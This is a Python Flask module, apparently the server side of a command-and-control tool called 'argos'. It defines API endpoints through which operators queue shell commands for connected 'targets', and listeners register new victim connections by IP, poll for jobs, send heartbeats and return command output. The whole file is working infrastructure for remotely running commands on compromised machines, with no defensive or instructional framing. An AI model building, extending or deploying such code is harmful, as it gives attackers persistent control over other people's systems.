# TODO handle db errors
# TODO make normalized responses
# TODO make them function blueprints
if __name__ == "__main__":
    raise RuntimeError("This should not be run as a standalone")

from __main__ import app
from flask import (
    request
)

from flask_login import (
    current_user,
    login_required,
 )

import argosdb


def listener_login_required(func):
    """
    decorator to authenticate listener users
    use it like this @listener_login_required before a 
    function declaration.
    """
    def wrapper_func():
        api_key = request.headers.get("Authorization")
        if api_key is None:
            return {'success': False, 'msg': "No api key provided"}
        
        listener = argosdb.auth_listener(api_key)

        if listener is None:
            return {'success': False, 'msg': "Bad api key"}
        
        return func(listener=listener)
    wrapper_func.__name__ = func.__name__
    return wrapper_func


@app.route('/api/v1/command_history/<target_id>', methods=["GET"])
@login_required
def command_history(target_id=-1):
    """
    Get all the commands typed by the current user on a target. Used 
    by the web client to construct the history.
    :param target_id int: the id of the target
    :return [dict]: the commands info
    """
    commands = argosdb.get_user_command_history_of_target(target_id, current_user.id)
    if commands == None:
        return {'success': False, 'msg': "No command on this target"}
    return commands


@app.route('/api/v1/send_command/<target_id>', methods=["POST"])
@login_required
def send_command(target_id=-1):
    """
    Send a new command to a target.
    Post body should be: 'cmd'=<data>
    :return str: ko/ok if it succeeded
    """
    command = request.form.get('cmd')
    if command is None:
        return {'success': False, 'msg': "No 'cmd' provided"}
    
    if argosdb.get_target_by_id(target_id) is None:
        return {'success': False, 'msg': "target_id seems incorrect"}
    
    argosdb.add_new_command(command, target_id, current_user.id)
    return {'success': True, 'msg': ""}


@app.route('/api/v1/targets', methods=["GET"])
@login_required
def targets():
    """
    Return the list of existing targets
    :return [dict]: the list of targets (see db schema for dict structure)
    """
    targets = argosdb.get_all_targets()
    return targets


# # Listener functions are not using the @login_required since listeners
# are not regular users and are identified with their unique api key
@app.route('/api/v1/new_target', methods=["POST"])
@listener_login_required
def new_target(listener=None):
    """
    When the listener gets a new connection, it hits
    this to create a new target associated with it.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    post body should be like this: ip_addr=<ip>&display_name<ip>
    """
    ip_addr = request.form.get('ip_addr')
    display_name = request.form.get('display_name')
    if ip_addr is None or display_name is None:
        return {'success': False, 'msg': 'ip_addr and display_name are required'}
    
    target_id = argosdb.add_new_target(display_name, ip_addr, listener["id"])
    return {'success': True if target_id != -1 else False, 'data': {'id': target_id}}


@app.route('/api/v1/current_jobs', methods=["GET"])
@listener_login_required
def current_jobs(listener=None):
    """
    Retrieve all the jobs that needs to be procceded by the 
    agents.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    :return [dict]: {'id': <int>, 'target_id': int, 'ip_addr': <str>, 'command': <str>}
    """
    commands = argosdb.get_all_active_commands_for_listener(listener['id'])
    jobs = []
    for command in commands:
        target_info = argosdb.get_target_by_id(command['executed_on'])
        jobs.append({
            'command_id': command['id'],
            'target_id': target_info['id'],
            'target_name': target_info['display_name'],
            'target_ip': target_info['ip_addr'],
            'command': command['command']
        })

    return {'success': True, 'data': jobs}


@app.route('/api/v1/heartbeat', methods=["POST"])
@listener_login_required
def heartbeat_(listener=None):
    """
    Give life signs from agent/listener.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    body params: target_id=<int>
    """
    target_id = request.form.get('target_id')
    if target_id is None:
        return {'success': False, 'msg': 'target_id required'}

    argosdb.update_heartbeat_listener(listener['id'])
    argosdb.update_heartbeat_target(target_id)
    return {'success': True, 'msg': "updated heartbeats"}


@app.route('/api/v1/output', methods=["POST"])
@listener_login_required
def output(listener=None):
    """
    Endpoint used to provide output for a command.
    Post body should be: command_id=<id>&output=<output>
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    """
    command_id = request.form.get('command_id')
    output = request.form.get('output')

    if command_id is None or output is None:
        return {'success': False, 'msg': 'command_id and output required'}

    argosdb.set_command_output(command_id, output)

    target_id = argosdb.get_target_from_command_id(command_id)

    argosdb.update_heartbeat_listener(listener['id'])
    argosdb.update_heartbeat_target(target_id)

    return {'success': True, 'msg': "updated command"}
